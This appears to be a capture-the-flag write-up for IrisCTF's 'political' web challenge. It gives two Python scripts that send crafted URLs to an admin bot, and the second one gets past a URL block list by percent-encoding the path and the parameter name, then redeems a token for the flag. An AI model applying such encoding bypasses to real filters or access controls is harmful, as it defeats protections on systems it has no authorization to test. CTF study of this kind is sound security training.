---
created: 2025-01-04T20:01
updated: 2025-01-05T19:13
points: 50
solves: 152
---

I knew from a glance that we have to bypass the url block list.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1736122279/2025/01/eb88daca51107b101aaaa0a81793cbac.png)

I knew I can just use a second argument to bypass `token`, but idk how to bypass `*/giveflag`

```python
import requests
from pwn import *
context.log_level = "error"
t = "https://political-web.chal.irisc.tf"
token = requests.get(t + "/token").text
print(token)
p = t+'/giveflag?foo=bar&token='+token

conn = remote("political-bot.chal.irisc.tf", 1337)
conn.sendline(p.encode())
print(p)
sleep(2)
print(conn.recvall().decode())
print(requests.post(t + "/redeem", data={"token": token}).text)
```

My teammate @dxleryt then solved it.

```python
import requests
from pwn import *

context.log_level = "error"

t = "https://political-web.chal.irisc.tf"
token = requests.get(t + "/token").text
print(token)

encoded_p = t + "/%2fgiveflag?%74oken=" + token

conn = remote("political-bot.chal.irisc.tf", 1337)
conn.sendline(encoded_p.encode())
print(encoded_p)
sleep(2)
print(conn.recvall().decode())
print(requests.post(t + "/redeem", data={"token": token}).text)
```

```flag
irisctf{flag_blocked_by_admin}
```
